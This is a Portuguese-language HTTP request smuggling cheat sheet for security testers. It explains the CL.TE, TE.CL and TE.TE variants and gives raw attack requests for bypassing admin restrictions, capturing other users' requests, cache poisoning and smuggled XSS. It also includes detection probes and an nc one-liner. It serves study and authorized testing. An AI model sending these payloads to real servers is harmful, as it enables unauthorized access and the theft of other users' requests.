# 📦 Guia de referência de HTTP request smuggling

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

> **Notas de precisão:** Request smuggling é a introdução de pedidos através de divergências de enquadramento/interpretação entre componentes. Segundo a [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html), uma mensagem com Transfer-Encoding e Content-Length exige tratamento específico; não se deve interpretar a coexistência como um formato legítimo de uso geral. Os exemplos são ilustrativos: alguns comprimentos e tamanhos de blocos precisam de corresponder aos bytes efetivamente transmitidos. Os números, espaços, linhas vazias e finais de linha LF dos exemplos originais foram preservados; Markdown não substitui a preparação correta de uma mensagem HTTP com CRLF. Um timeout ou uma resposta 404 isolada não provam explorabilidade. A presença de proxy, CDN ou conversão HTTP/2→HTTP/1.1 é um contexto de teste, não uma vulnerabilidade confirmada ([PortSwigger](https://portswigger.net/web-security/request-smuggling)).

---

<a id="-what-is-request-smuggling"></a>
## 🎯 O que é request smuggling

O **HTTP request smuggling** explora diferenças na interpretação de pedidos HTTP entre o front-end (proxy) e o servidor de back-end, permitindo introduzir pedidos adicionais.

### Impacto
- 🔴 **Contorno de controlos de segurança** — Contorno de WAF/ACL
- 🔴 **Envenenamento da cache web** — Armazenar respostas maliciosas em cache
- 🔴 **Roubo de credenciais** — Capturar pedidos de outros utilizadores
- 🔴 **XSS** — XSS refletido através de um pedido introduzido indevidamente

---

<a id="-how-it-works"></a>
## 🔍 Como funciona

### Cabeçalhos envolvidos
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Tipos de vulnerabilidade
| Tipo | O front-end utiliza | O back-end utiliza |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Ambos ofuscados | Um cabeçalho ignorado |

---

<a id="-attack-payloads"></a>
## 💉 Payloads de ataque

### CL.TE (Content-Length → Transfer-Encoding)

**O front-end utiliza Content-Length; o back-end utiliza Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Exploração:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**O front-end utiliza Transfer-Encoding; o back-end utiliza Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (Transfer-Encoding ofuscado)

```http
# Ofuscar o cabeçalho TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

<a id="-exploitation-examples"></a>
## 🔥 Exemplos de exploração

### Contornar a segurança do front-end
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Capturar pedidos de outros utilizadores
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*O pedido do utilizador seguinte é acrescentado a `data=`*

### Envenenamento de cache através de smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS através de smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

<a id="-detection"></a>
## 🔍 Deteção

### Deteção baseada no tempo
```http
# Teste CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Se o back-end utilizar TE, aguarda o bloco "0"
# Tempo limite excedido = possível vulnerabilidade
```

### Diferença entre respostas
```http
# Enviar um pedido introduzido indevidamente que provoque 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Se a resposta seguinte for 404, pode existir uma vulnerabilidade (ver nota)
```

---

<a id="-tools"></a>
## 🛠️ Ferramentas

### Extensão do Burp Suite
```
1. Instalar a extensão "HTTP Request Smuggler"
2. Clicar com o botão direito no pedido → Extensions → Launch Smuggle Probe
3. Verificar os resultados à procura de vulnerabilidades de smuggling
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Testes manuais com curl
```bash
# Nota: o curl normaliza cabeçalhos; pode ser necessário TCP sem essa normalização
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Lista de verificação de deteção
```markdown
- [ ] Verificar a presença de proxy/balanceador de carga (vários servidores)
- [ ] Testar o comportamento temporal de CL.TE
- [ ] Testar o comportamento temporal de TE.CL
- [ ] Experimentar a ofuscação do cabeçalho TE
- [ ] Confirmar através da diferença entre respostas
```

### Indicadores comuns
```
- Balanceadores de carga (AWS ALB, HAProxy)
- Proxies inversos (nginx, Apache)
- CDN (Cloudflare, Akamai)
- Conversão de HTTP/2 para HTTP/1.1
```

---

<a id="-important-notes"></a>
## ⚠️ Notas importantes

```
1. Os testes podem perturbar outros utilizadores
2. Utilizar ambientes de teste isolados sempre que possível
3. Adicionar identificadores únicos para reconhecer os seus pedidos
4. Reportar de forma responsável com uma prova de conceito (PoC)
```

---

<a id="-resources"></a>
## 📚 Recursos

- [HTTP request smuggling na PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Ferramenta Smuggler](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Teste o request smuggling!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
